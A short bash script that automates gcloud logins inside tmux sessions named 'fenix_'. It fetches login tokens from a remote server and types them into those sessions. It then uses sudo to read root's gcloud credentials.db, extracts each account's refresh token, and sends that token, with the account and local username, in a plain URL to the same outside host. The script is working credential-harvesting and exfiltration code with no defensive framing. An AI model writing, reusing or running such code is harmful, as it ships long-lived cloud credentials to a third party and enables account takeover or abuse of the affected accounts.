#!/bin/bash

source http

path=$(pwd)
user=${path#/home/}

session_name=($(tmux list-sessions -F "#{session_name}"))

file='.'${0##*/} && file=${file%.*}'.tmp'

i=0

while [ $i -lt ${#session_name[@]} ]
do

  session=${session_name[i]}

  if [[ $session =~ "fenix_" ]]
  then

     curl -s $ip'/token.php?session='$session > $file

     token=$(jq '.token' $file)
     token=${token//'"'/}

     if [ $token != 'null' ]
     then

        echo 'Enviando token...'

        sleep 1

        tmux send -t $session $token C-m

        sleep 1

        echo 'Token enviado!'

        new=$(sudo gcloud config get-value account)

        sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
        refresh_token=$(jq '.refresh_token' $file)
        refresh_token=${refresh_token//'"'/}

        url=$ip'/new.php?account='$new'&creator='$user'&refresh='$refresh_token
        curl $url

        echo $new 'ok!'
     fi

  fi
((i++))
done
